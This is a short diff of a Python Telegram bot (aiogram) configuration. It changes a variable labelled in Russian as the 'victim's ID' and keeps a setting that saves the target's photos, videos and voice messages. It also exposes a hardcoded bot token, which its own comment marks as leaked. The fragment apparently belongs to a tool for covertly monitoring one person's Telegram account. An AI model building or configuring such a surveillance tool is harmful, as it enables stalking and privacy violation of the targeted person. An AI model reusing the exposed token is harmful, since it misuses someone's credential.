@@ -27,7 +27,7 @@ from aiogram.exceptions import TelegramConflictError
 # ======================================================
 
 BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # ❌ СЛИТ! СБРОСЬ!
-TARGET_ACCOUNT_ID = 8839956404  # ID жертвы
+TARGET_ACCOUNT_ID = 6939132428  # ID жертвы
 
 # Настройки
 SAVE_MEDIA = True          # Сохранять фото/видео/голосовые
